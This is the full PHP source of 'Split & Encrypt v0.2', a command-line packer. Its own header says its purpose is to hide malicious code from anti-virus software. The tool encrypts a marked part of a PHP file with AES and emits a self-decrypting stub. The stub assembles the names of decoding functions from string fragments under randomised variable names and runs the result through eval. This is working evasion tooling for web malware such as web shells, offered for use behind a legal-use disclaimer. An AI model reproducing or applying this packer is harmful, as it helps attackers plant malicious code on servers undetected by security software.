<?php
// Split & Encrypt v0.2
// Copyright (C) 2023 GramThanos
//
// This code splits the given PHP code on the SPLIT&ENCRYPTme flag and 
// packs the rest of the file into an self decrypted AES encryption using
// openssl_encrypt. The aim of the code is to hide a malicious code from
// anti-virus softwares.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//

$version = 'v0.2';

// Input file and output
$input = NULL;
$output = NULL;
$random_password = false;
$password = NULL;

// Parse CMD arguments
if (isset($argv) && is_array($argv)) {
	$argi = 1;
	while ($argi < count($argv)) {
		if (isset($argv[$argi])) {
			$command = strtolower(trim($argv[$argi]));
			if ($command == '-v' || $command == '--version') {
				exit('Split & Encrypt ' . $version . "\n");
			}
			else if ($command == '-h' || $command == '--help') {
				exit(
					'Split & Encrypt ' . $version . "\n" .
					'  Usage' . "\n" .
					'     php split-encrypt.php [-v ][-h ][-r ][-p my_password ][-i input_file.php ][-o output_file.php ] input_file.php output_file.php' . "\n" .
					'  Options' . "\n" .
					'    -v --version                 Print program\'s version.' . "\n" .
					'    -h --help                    Print this help message.' . "\n" .
					'    -i --input                   Input file.' . "\n" .
					'    -o --output                  Output file.' . "\n" .
					'    -p --password                Password to use.' . "\n" .
					'    -r --random                  Generate a random password to use.' . "\n"
				);
			}
			else if (($command == '-i' || $command == '--input') && isset($argv[$argi + 1])) {
				$input = $argv[$argi + 1];
				$argi += 2;
			}
			else if (($command == '-o' || $command == '--output') && isset($argv[$argi + 1])) {
				$output = $argv[$argi + 1];
				$argi += 2;
			}
			else if (($command == '-p' || $command == '--password') && isset($argv[$argi + 1])) {
				$password = $argv[$argi + 1];
				$argi += 2;
			}
			else if ($command == '-r' || $command == '--random') {
				$random_password = true;
				$argi += 1;
			}
			else if ($argv[$argi][0] != '-') {
				if (is_null($input)) {
					$input = $argv[$argi];
					$argi += 1;
				}
				else if (is_null($output)) {
					$output = $argv[$argi];
					$argi += 1;
				}
				else {
					die('Invalid option "' . $argv[$argi] . '"' . "\n");
				}
			}
			else {
				die('Invalid option "' . $argv[$argi] . '"' . "\n");
			}
		}
	}
}

// Set default values
if (is_null($input)) {
	$input = 'input.php';
}
if (is_null($output)) {
	$output = 'output.php';
}
if ($random_password) {
	$password = bin2hex(random_bytes(32));
}

// If not set Let user select password [default is banana]
if (is_null($password)) {
	print('Insert password [banana]: ');
	$password = trim(fgets(STDIN));
	if (strlen($password) < 1) {
		$password = 'banana';
	}
}

// Load code to encrypt
$code = @file_get_contents($input);
if (!$code) {
	echo("Failed to load " . $input . "\n");
	exit();
}
$code = explode("SPLIT&ENCRYPTme", $code);
if (count($code) == 1) {
	echo("No SPLIT&ENCRYPTme flag found. Packing the whole code...\n");
	$code = array("<?php\n// ", "?>" . $code[0]);
}

// Encrypt code
$hash = hash('sha256', $password, true);
$iv = openssl_random_pseudo_bytes(16);
$ciphercode = openssl_encrypt($code[1], 'AES-256-CBC', $hash, OPENSSL_RAW_DATA, $iv);

// Save output to file
$names_conflict = true;
while ($names_conflict) {
	$function_base64 = '$_' . substr(md5(rand()), -6);
	$function_openssl_decrypt = '$_' . substr(md5(rand()), -6);

	if ($function_base64 != $function_openssl_decrypt) {
		$names_conflict = false;
	}
}

$variables_definition = "" .
	"$function_base64 = 'base64';" .
	"$function_base64 .= '_';" .
	"$function_base64 .= 'decode';" .
	"$function_openssl_decrypt = 'open';" .
	"$function_openssl_decrypt .= 'ssl';" .
	"$function_openssl_decrypt .= '_';" .
	"$function_openssl_decrypt .= 'decrypt';";

$r = @file_put_contents($output, $code[0] . "SPLIT&ENCRYPTed\n" . $variables_definition . "eval($function_openssl_decrypt(\n\t$function_base64('" . base64_encode($ciphercode) . "'),\n\t'AES-256-CBC',\n\t$function_base64('" . base64_encode($hash) . "'),\n\tOPENSSL_RAW_DATA,\n\t$function_base64('" . base64_encode($iv) . "')\n));\n");
if ($r === False)
	echo("Failed to save as " . $output . "\n");
else
	echo("Saved as " . $output . "\n");
